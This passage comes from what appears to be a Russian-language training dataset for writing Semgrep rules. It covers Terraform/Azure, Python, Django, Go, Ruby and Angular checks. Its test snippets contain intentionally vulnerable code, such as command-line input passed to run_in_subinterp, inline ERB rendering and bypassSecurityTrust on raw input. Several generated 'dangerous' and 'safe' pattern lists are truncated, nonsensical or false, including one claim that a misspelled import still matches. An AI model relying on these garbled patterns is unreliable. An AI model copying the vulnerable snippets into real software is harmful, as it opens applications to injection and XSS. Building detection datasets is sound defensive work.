azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    app_servic\n• resource \"azurerm_function_app\" \"example\" { \n    name = \"example-function-app\"\n    location = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    \n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-client-certificate: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-client-certificate: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-appservice-client-certificate\n  message: >-\n    Ensure the web app has Client Certificates\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      client_cert_enabled = true\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure App Service в конфигурациях Terraform, где не указан параметр client_cert_enabled. Правило использует шаблон ресурса и исключает случаи, когда этот параметр явно установлен в true внутри блока ресурса. Таким образом, если ресурс определен без включения клиентских сертификатов, он считается опасным.\n\n# Ключевые элементы:\n- ID: azure-appservice-client-certificate\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-client-certificate",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: dangerous-testcapi-run-in-subinterp-tainted-env-args\nОписание уязвимости: Found user controlled content in `run_in_subinterp`. This is dangerous because it allows a malicious actor to run arbitrary Python code.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-testcapi-run-in-subinterp-tainted-env-args.py\nimport sys\nimport _testcapi\nfrom test import support\n\n\ndef bad1() -> None:\n    payload = sys.argv[1]\n    # ruleid: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(payload)\n\n\ndef bad2() -> None:\n    payload = sys.argv[1]\n    # ruleid: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    support.run_in_subinterp(payload)\n\n\ndef fn1(payload: str) -> None:\n    # fn: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(payload)\n\n\ndef fn2(payload: str) -> None:\n    # fn: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    support.run_in_subinterp(payload)\n\n\ndef okTest(payload: str) -> None:\n    # ok: dangerous-testcapi-run-in-subinterp-tainted-env-args\n    _testcapi.run_in_subinterp(\"print('Hello world')\")  # Ограничиваем длину\n\nОпасные паттерны:\n• payload = sys.argv[1]; _testcapi.run_in_subinterp(payload)\n• payload = os.environ['VARIABLE']; _testcapi.run_in_subinterp(payload)\n\nБезопасные паттерны:  \n• okTest('fixed_payload')\n• _testcapi.run_in_subinterp('hardcoded_string')\n\nЛегенда аннотаций:\n- // ruleid:dangerous-testcapi-run-in-subinterp-tainted-env-args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-testcapi-run-in-subinterp-tainted-env-args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-testcapi-run-in-subinterp-tainted-env-args\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: os.environ\n          - pattern: os.environ.get('$FOO', ...)\n          - pattern: os.environb\n          - pattern: os.environb.get('$FOO', ...)\n          - pattern: os.getenv('$ANYTHING', ...)\n          - pattern: os.getenvb('$ANYTHING', ...)\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern-either:\n              - pattern: sys.argv\n              - pattern: sys.orig_argv\n          - patterns:\n            - pattern-inside: |\n                $PARSER = argparse.ArgumentParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-inside: |\n                $PARSER = optparse.OptionParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.getopt(...)\n                  ...\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.gnu_getopt(...)\n                  ...\n            - pattern-either:\n              - patterns:\n                - pattern-inside: |\n                    for $O, $A in $OPTS:\n                      ...\n                - pattern: $A\n              - pattern: $ARGS\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          _testcapi.run_in_subinterp($PAYLOAD, ...)\n      - pattern-inside: |\n          test.support.run_in_subinterp($PAYLOAD, ...)\n    - pattern: $PAYLOAD\n    - pattern-not: |\n        _testcapi.run_in_subinterp(\"...\", ...)\n    - pattern-not: |\n        test.support.run_in_subinterp(\"...\", ...)\n  message: >-\n    Found user controlled content in `run_in_subinterp`.\n    This is dangerous because it allows a malicious actor to run arbitrary Python code.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  severity: WARNING\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции run_in_subinterp из модуля _testcapi или test.support с потенциально загрязненным источником данных. Источники данных могут быть получены из окружения (os.environ, os.environ.get), аргументов командной строки (sys.argv, sys.orig_argv), парсинга аргументов (argparse, optparse, getopt). Синтаксис паттернов источников включает проверки на наличие этих источников внутри определенных конструкций, таких как инициализация парсера аргументов и получение аргументов. Паттерны sinkов проверяют фактическое выполнение run_in_subinterp с использованием переменной PAYLOAD, которая может быть загрязнена данными пользователя.\n\n# Ключевые элементы:\n- ID: dangerous-testcapi-run-in-subinterp-tainted-env-args\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-testcapi-run-in-subinterp-tainted-env-args",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: use-decimalfield-for-money\nОписание уязвимости: Found a FloatField used for variable $F. Use DecimalField for currency fields to avoid float-rounding errors.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: use-decimalfield-for-money.py\nfrom django.db import models\nfrom django.utils import timezone\n\n# Create your models here.\n\nclass Product(models.Model):\n    title = models.CharField(max_length=64)\n    description = models.TextField()\n    # ok:use-decimalfield-for-money\n    price = models.DecimalField(max_digits=6, decimal_places=2)\n    # ruleid:use-decimalfield-for-money\n    old_price = models.FloatField()\n    image = models.CharField(max_length=256)\n    stock = models.IntegerField(null=True)\n    date_added = models.DateTimeField(default=timezone.now)\n    # ruleid:use-decimalfield-for-money\n    orignalPrice = models.FloatField(verbose_name=u\"smth\")\n\nclass User(models.Model):\n    email = models.EmailField()\n    password = models.CharField(max_length=32)\n\n    gender = models.BooleanField()\n    first_name = models.CharField(max_length=32)\n    last_name = models.CharField(max_length=32)\n\n    postal_code = models.CharField(max_length=16)\n    house_number_additions = models.CharField(max_length=16)\n    street_name = models.CharField(max_length=64)\n    city_name = models.CharField(max_length=32)\n    country = models.CharField(max_length=32)\n\n    phone_number = models.CharField(max_length=16)\n    date_of_birth = models.DateField()  # Ограничиваем длину\n\nОпасные паттерны:\n• old_price = models.FloatField()\n• orignalPrice = models.FloatField(verbose_name=u\"smth\")\n\nБезопасные паттерны:  \n• price = models.DecimalField(max_digits=6, decimal_places=2)\n• DecimalField(max_digits=10, decimal_places=2) = models.DecimalField(...)\n\nЛегенда аннотаций:\n- // ruleid:use-decimalfield-for-money: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-decimalfield-for-money: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-decimalfield-for-money\n    patterns:\n      - pattern-inside: |\n          class $M(...):\n            ...\n      - pattern: $F = django.db.models.FloatField(...)\n      - metavariable-regex:\n          metavariable: $F\n          regex: .*([pP][rR][iI][cC][eE]|[aA][mM][oO][uU][nN][tT]|[sS][uU][bB][tT][oO][tT][aA][lL]|[dD][oO][nN][aA][tT][iI][oO][nN]|[fF][eE][eE]|[sS][aA][lL][aA][rR][yY]|[pP][rR][eE][cC][iI][oO]).*\n    message: Found a FloatField used for variable $F. Use DecimalField for currency fields to avoid float-rounding errors.\n    languages: [python]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - django\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования Django FloatField вместо DecimalField при работе с денежными значениями. Django рекомендует использовать DecimalField для денежных полей, чтобы избежать ошибок округления чисел с плавающей точкой. Правило использует шаблон класса модели Django и метавариабельную регулярку для поиска переменных, имена которых содержат слова, связанные с деньгами, такие как 'price', 'amount', 'subtotal' и другие. Если найдено совпадение с FloatField, выдается предупреждение.\n\n# Ключевые элементы:\n- ID: use-decimalfield-for-money\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-decimalfield-for-money",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: detect-gemini\nОписание уязвимости: Possibly found usage of AI: Gemini\nCWE: \nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-gemini.go\n// ruleid: detect-gemini\nimport \"github.com/google/generative-ai-go/genai\"\nimport \"google.golang.org/api/option\"\n\nctx := context.Background()\n// Access your API key as an environment variable (see \"Set up your API key\" above)\n// ruleid: detect-gemini\nclient, err := genai.NewClient(ctx, option.WithAPIKey(os.Getenv(\"API_KEY\")))\nif err != nil {\n    log.Fatal(err)\n}\ndefer client.Close()\n\nmodel := client.GenerativeModel(\"gemini-1.5-flash\")  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: detect-gemini-dangerous.go\nimport (\n\"github.com/google/generative-ai-go\"\n)\n...\ngenai.NewClient(...)\n• // File: another-detect-gemini-dangerous.go\ngooglE.gOoGLe.cOm.GenAI.NewClient(...) // misspelled import but still matches\n\nБезопасные паттерны:  \n• // File: detect-gemini-safe.go\nimport \"github.com/google/cloud-go\"\n• // File: safe-code.go\nfunc main() { \n   fmt.Println(\"Hello World\") \n}\n\nЛегенда аннотаций:\n- // ruleid:detect-gemini: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-gemini: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-gemini\n    languages:\n      - go\n    severity: INFO\n    message: \"Possibly found usage of AI: Gemini\"\n    pattern-either:\n      - pattern: import \"github.com/google/generative-ai-go\"\n      - pattern: genai.NewClient(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможного использования библиотеки или функции, связанной с искусственным интеллектом Gemini. Анализ выполняется путем поиска импортов пакета 'github.com/google/generative-ai-go' и вызова функции 'genai.NewClient(...)', которая может быть использована для взаимодействия с моделью Gemini.\n\n# Ключевые элементы:\n- ID: detect-gemini\n- Язык: go \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-gemini",
      "language": "go",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: azure-securitycenter-email-alert-admins\nОписание уязвимости: Ensure that Send email notification for high severity alerts is set to On\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-securitycenter-email-alert-admins.tf\n# fail\n# ruleid: azure-securitycenter-email-alert-admins\nresource \"azurerm_security_center_contact\" \"example\" {\n    email = \"contact@example.com\"\n    alerts_to_admins    = false\n}\n\n# pass\nresource \"azurerm_security_center_contact\" \"example\" {\n    email = \"contact@example.com\"\n    phone = \"+1-555-555-5555\"\n    alert_notifications = true\n    alerts_to_admins    = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n    email = \\\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:azure-securitycenter-email-alert-admins: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-securitycenter-email-alert-admins: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-securitycenter-email-alert-admins\n    message: >-\n      Ensure that Send email notification for high severity alerts is set to On\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_security_center_contact\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_security_center_contact\" \"...\" {\n          ...\n          alerts_to_admins = true\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure Security Center, где отправка уведомлений по электронной почте администраторам настроена неправильно. Анализ выполняется путем поиска ресурса типа 'azurerm_security_center_contact' в HCL-коде. Правило проверяет наличие блока 'alerts_to_admins', который не установлен в значение 'true'. Если этот параметр отсутствует или имеет другое значение, кроме 'true', правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: azure-securitycenter-email-alert-admins\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-securitycenter-email-alert-admins",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: azure-appservice-java-version\nОписание уязвимости: Ensure that Java version is the latest, if used to run the web app\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: azure-appservice-java-version.tf\n# fail\n# ruleid: azure-appservice-java-version\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    java_version = \"1.7.0_80\"\n    scm_type                 = \"someValue\"\n  }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    java_version = \"11\"\n    scm_type                 = \"someValue\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-java-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-java-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-appservice-java-version\n    message: >-\n      Ensure that Java version is the latest, if used to run the web app\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          site_config {\n            ...\n            java_version = \"11\"\n            ...\n          }\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревших версий Java в ресурсах Azure App Service. Анализ выполняется путем поиска шаблонов HCL-кода, которые соответствуют определению ресурса Azure App Service. Правило проверяет наличие явной установки версии Java через атрибут 'java_version' внутри блока 'site_config'. Если версия не является актуальной (например, '1.7.0_80'), то выдается предупреждение. Безопасным считается случай, когда указана актуальная версия Java ('11' в данном примере).\n\n# Ключевые элементы:\n- ID: azure-appservice-java-version\n- Язык: hcl \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "azure-appservice-java-version",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: avoid-render-inline\nОписание уязвимости: 'render inline: ...' renders an entire ERB template inline and is dangerous. If external data can reach here, this exposes your application to server-side template injection (SSTI) or cross-site scripting (XSS) attacks. Instead, consider using a partial or another safe rendering method.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-render-inline.rb\n# cf. https://github.com/rails/rails/blob/939fe523126198d43ecedeacc05dd7fdb1eae3d9/actionpack/test/controller/action_pack_assertions_test.rb\n\n\n# frozen_string_literal: true\n\nrequire \"abstract_unit\"\nrequire \"controller/fake_controllers\"\n\nclass ActionPackAssertionsController < ActionController::Base\n  def nothing() head :ok end\n\n  # ok: avoid-render-inline\n  def hello_xml_world() render template: \"test/hello_xml_world\"; end\n\n  def assign_this\n    @howdy = \"ho\"\n    # ruleid: avoid-render-inline\n    render inline: \"Mr. Henke\"\n  end\n\n  def render_based_on_parameters\n    # ok: avoid-render-inline\n    render plain: \"Mr. #{params[:name]}\"\n  end\n\n  def render_url\n    # ok: avoid-render-inline\n    render html: \"<div>#{url_for(action: 'flash_me', only_path: true)}</div>\"\n  end\n\n  def render_text_with_custom_content_type\n    # ok: avoid-render-inline\n    render body: \"Hello!\", content_type: Mime[:rss]\n  end\n\n  def session_stuffing\n    session[\"xmas\"] = \"turkey\"\n    # ok: avoid-render-inline\n    render text: \"ho ho ho\"\n  end\n\n  def raise_exception_on_get\n    raise \"get\" if request.get?\n    # ok: avoid-render-inline\n    render text: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def raise_exception_on_post\n    raise \"post\" if request.post?\n    # ok: avoid-render-inline\n    render plain: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def render_file_absolute_path\n    # ok: avoid-render-inline\n    render file: File.expand_path(\"../../README.rdoc\", __dir__)\n  end\n\n  def render_file_relative_path\n    # ok: avoid-render-inline\n    render file: \"README.rdoc\"\n  end\nend\n\n# Used to test that assert_response includes the exception message\n# in the failure message when an action raises and assert_response\n# is expecting something other than an error.\nclass AssertResponseWithUnexpectedErrorController < ActionController::Base\n  def index\n    raise \"FAIL\"\n  end\n\n  def show\n    # ok: avoid-render-inline\n    render plain: \"Boom\", status:   # Ограничиваем длину\n\nОпасные паттерны:\n• render inline: \"<%= params[:input] %>\"\n• render inline: \"<%= @user.name %>\"\n• render inline: \"<%= current_user.email %>\"\n\nБезопасные паттерны:  \n• render template: \"template_name\"\n• render plain: \"text\"\n• render html: \"<div>html content</div>\"\n\nЛегенда аннотаций:\n- // ruleid:avoid-render-inline: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-render-inline: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-render-inline\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_render_inline.rb\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://brakemanpro.com/2017/09/08/cross-site-scripting-in-rails#inline-renders---even-worse-than-xss\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    'render inline: ...' renders an entire ERB template inline and is dangerous.\n    If external data can reach here, this exposes your application\n    to server-side template injection (SSTI) or cross-site scripting (XSS) attacks.\n    Instead, consider using a partial or another safe rendering method.\n  languages: [ruby]\n  severity: WARNING\n  pattern: 'render inline: ...'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'render inline:' в Ruby/Rails приложениях. Паттерн ищет точное совпадение строки 'render inline: ...'. Опасным является случай, когда внешний ввод может достичь этого места, так как это открывает возможность для серверной инъекции шаблонов (Server Side Template Injection, SSTI) или межсайтовых скриптовых атак (Cross-site Scripting, XSS). Правило рекомендует использовать альтернативные безопасные методы рендеринга.\n\n# Ключевые элементы:\n- ID: avoid-render-inline\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-render-inline",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: use-defused-xmlrpc\nОписание уязвимости: Detected use of xmlrpc. xmlrpc is not inherently safe from vulnerabilities. Use defusedxml.xmlrpc instead.\nCWE: CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: use-defused-xmlrpc.py\n# ruleid:use-defused-xmlrpc\nimport xmlrpclib\n# ruleid:use-defused-xmlrpc\nimport SimpleXMLRPCServer\n# ruleid:use-defused-xmlrpc\nimport xmlrpc.server\n\n# ok:use-defused-xmlrpc\nimport defusedxml.xmlrpc.server  # Ограничиваем длину\n\nОпасные паттерны:\n• import xmlrpclib\n• import SimpleXMLRPCServer\n• import xmlrpc\n\nБезопасные паттерны:  \n• import defusedxml.xmlrpc.server\n\nЛегенда аннотаций:\n- // ruleid:use-defused-xmlrpc: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-defused-xmlrpc: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-defused-xmlrpc\n  pattern-either:\n  - pattern: import xmlrpclib\n  - pattern: import SimpleXMLRPCServer\n  - pattern: import xmlrpc\n  message: >-\n    Detected use of xmlrpc. xmlrpc is not inherently safe from vulnerabilities.\n    Use defusedxml.xmlrpc instead.\n  metadata:\n    cwe:\n    - \"CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')\"\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    source-rule-url: https://github.com/PyCQA/bandit/blob/07f84cb5f5e7c1055e6feaa0fe93afa471de0ac3/bandit/blacklists/imports.py#L160\n    references:\n    - https://pypi.org/project/defusedxml/\n    - https://docs.python.org/3/library/xml.html#xml-vulnerabilities\n    category: security\n    technology:\n    - python\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  severity: ERROR\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска импортов библиотек, связанных с небезопасным использованием xmlrpc в Python. Оно использует шаблон 'pattern-either' для обнаружения трех возможных конструкций импорта: 'xmlrpclib', 'SimpleXMLRPCServer' и 'xmlrpc'. Если любая из этих конструкций найдена, выдается сообщение об ошибке, предупреждающее о потенциальной уязвимости и рекомендующее использовать вместо этого библиотеку 'defusedxml.xmlrpc'. Анализ выполняется методом поиска (search) в коде на языке Python.\n\n# Ключевые элементы:\n- ID: use-defused-xmlrpc\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-defused-xmlrpc",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: angular-bypasssecuritytrust\nОписание уязвимости: Detected the use of `$TRUST`. This can introduce a Cross-Site-Scripting (XSS) vulnerability if this comes from user-provided input. If you have to use `$TRUST`, ensure it does not come from user-input or use the appropriate prevention mechanism e.g. input validation or sanitization depending on the context.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: typescript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: angular-domsanitizer.ts\nimport { DomSanitizer, SecurityContext } from '@angular/platform-browser'\nimport DOMPurify from 'dompurify'\n\nclass SomeClass {\n    constructor(private sanitizer: DomSanitizer){}\n\n    bypass(value: string){\n        // ruleid:angular-bypasssecuritytrust\n        let html = this.sanitizer.bypassSecurityTrustHtml(value);\n        // ruleid:angular-bypasssecuritytrust\n        let style = this.sanitizer.bypassSecurityTrustStyle(value);\n        // ruleid:angular-bypasssecuritytrust\n        let script = this.sanitizer.bypassSecurityTrustScript(value);\n        // ruleid:angular-bypasssecuritytrust\n        let resource_url = this.sanitizer.bypassSecurityTrustResourceUrl(value);\n        // ruleid:angular-bypasssecuritytrust\n        let url = this.sanitizer.bypassSecurityTrustUrl(value);\n\n\n        // ok:angular-bypasssecuritytrust\n        let url1 = this.sanitizer.bypassSecurityTrustUrl(\"a\");\n        // ok:angular-bypasssecuritytrust\n        let html1 = this.sanitizer.bypassSecurityTrustHtml(\"value\");\n        // ok:angular-bypasssecuritytrust\n        let html2 = this.sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(\"value\"))\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• let html = this.sanitizer.bypassSecurityTrustHtml(value);\n• let style = this.sanitizer.bypassSecurityTrustStyle(value);\n• let script = this.sanitizer.bypassSecurityTrustScript(value);\n\nБезопасные паттерны:  \n• let url1 = this.sanitizer.bypassSecurityTrustUrl(\"a\");\n• let html1 = this.sanitizer.bypassSecurityTrustHtml(\"value\");\n• let html2 = this.sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(\"value\"))\n\nЛегенда аннотаций:\n- // ruleid:angular-bypasssecuritytrust: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:angular-bypasssecuritytrust: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: angular-bypasssecuritytrust\n  message: >-\n    Detected the use of `$TRUST`. This can introduce a Cross-Site-Scripting\n    (XSS) vulnerability if this comes from user-provided input. If you have to\n    use `$TRUST`, ensure it does not come from user-input or use the\n    appropriate prevention mechanism e.g. input validation or\n    sanitization depending on the context.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://angular.io/api/platform-browser/DomSanitizer\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    confidence: MEDIUM\n    category: security\n    technology:\n    - angular\n    - browser\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n  languages:\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n    - patterns:\n        - pattern-either:\n            - pattern-inside: |\n                function ...({..., $X: string, ...}) { ... }\n            - pattern-inside: |\n                function ...(..., $X: string, ...) { ... }\n        - focus-metavariable: $X\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $X.$TRUST($Y)\n    - 